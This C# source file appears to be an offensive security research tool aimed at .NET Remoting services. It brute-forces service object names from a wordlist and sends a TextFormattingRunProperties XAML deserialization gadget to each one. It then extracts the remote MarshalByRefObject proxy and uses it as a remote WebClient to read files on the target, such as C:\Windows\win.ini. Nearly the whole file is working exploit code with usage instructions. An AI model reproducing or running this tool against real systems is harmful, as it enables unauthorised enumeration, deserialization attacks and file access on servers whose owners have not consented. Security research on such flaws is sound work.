using System;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Remoting;
using System.IO;
using System.Net;
using System.Runtime.Serialization;
using System.Reflection;
using CodeWhite.Remoting.Shared;
using System.Collections.Generic;

namespace CodeWhite.Remoting.RemotingClient_MBRO_BruteForcer
{
    internal class Program
    {
        static readonly string ASSEMBLY_LOCATION = Assembly.GetExecutingAssembly().Location;
        static readonly string XAML_PAYLOAD_FILE = "WebClient.xaml.xml";
        bool verbose = false;
        string serverUrl = null;
        string wordList = null;
        string fileUrl = null;

        internal static void Main(string[] args)
        {
            var program = new Program();
            program.ParseArguments(args);
            Uri serverURL = new Uri(args[0]);
            String wordListUrl = args[1];
            Uri fileUrl = new Uri(args[2]);

            RemotingConfiguration.Configure($"{Assembly.GetExecutingAssembly().Location}.config");

            // Read wordlist line by line
            foreach (string word in File.ReadLines(wordListUrl))
            {
                if (string.IsNullOrWhiteSpace(word)) continue;

                Uri objUrl = new Uri(serverURL, word);

                // Prepare and send XAML gadget
                object payload = new TextFormattingRunPropertiesMarshal(File.ReadAllText(XAML_PAYLOAD_FILE));

                const string key = "MBRO";

                var logicalCallContextData = new Dictionary<string, object>()
                {
                    { key, payload }
                };
                try
                {
                    // Remote method call
                    IMethodReturnMessage methodReturnMessage = Utils.CallRemoteToStringMethod(objUrl, logicalCallContextData);
                    if (program.verbose)
                    {
                        Console.WriteLine($"Trying \"{word}\"\n");
                    }
                    // Extract proxy from exception
                    var exception = methodReturnMessage.Exception;
                    while (exception.InnerException != null)
                        exception = exception.InnerException;

                    var mbro = (MarshalByRefObject)((object[])exception.Data[key])[0];
                    // Print information from remote object
                    Utils.PrintInfo(mbro);

                    try
                    {
                        // Use remote WebClient to download file
                        WebClient remoteWebClient = (WebClient)mbro;
                        string result = remoteWebClient.DownloadString(fileUrl);
                    }
                    catch (WebException ex) {
                        Console.WriteLine($"Service object name found: {word}, but the specified file is not available on the remote host\n");
                        continue;
                    }

                    Console.WriteLine($"Service object name found: {word}\n");
                }
                catch (NullReferenceException ex) {
                    if (program.verbose) {
                        Console.WriteLine($"error: {ex}\n");
                    }
                    continue;
                }
            }
        }
        private void ParseArguments(string[] args) {
            foreach (var arg in args)
            {
                if (arg == "-v" || arg == "--verbose")
                {
                    verbose = true;
                }
                else if (serverUrl == null)
                {
                    serverUrl = arg;
                }
                else if (wordList == null)
                {
                    wordList = arg;
                }
                else if (fileUrl == null)
                {
                    fileUrl = arg;
                }
                else
                {
                    Console.Error.WriteLine($"Unrecognized argument: {arg}");
                    PrintUsageAndExit();
                }
            }

            if (serverUrl == null || wordList == null || fileUrl == null)
            {
                PrintUsageAndExit();
            }
        }
        private void PrintUsageAndExit()
        {
            string exeName = Path.GetFileName(Environment.GetCommandLineArgs()[0]);
            Console.Error.WriteLine($"Usage: {exeName} [-v] <serverUrl> <wordList> <fileUrl>");
            Console.Error.WriteLine();
            Console.Error.WriteLine("Arguments:");
            Console.Error.WriteLine("  -v, --verbose       Enable verbose output (optional)");
            Console.Error.WriteLine("  <serverUrl>         URL to the server (required)");
            Console.Error.WriteLine("  <wordList>          Path to the word list file (required)");
            Console.Error.WriteLine("  <fileUrl>           Path to the target file (required)");
            Console.Error.WriteLine();
            Console.Error.WriteLine("Example:");
            Console.Error.WriteLine($@"  {exeName} -v tcp://127.0.0.1:12345/DummyService object.list C:\Windows\win.ini");
            Environment.Exit(1);
        }
    }

    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        string _xaml;
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            this._xaml = xaml;
        }
        void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties));
            info.AddValue("ForegroundBrush", this._xaml);
        }
    }
}
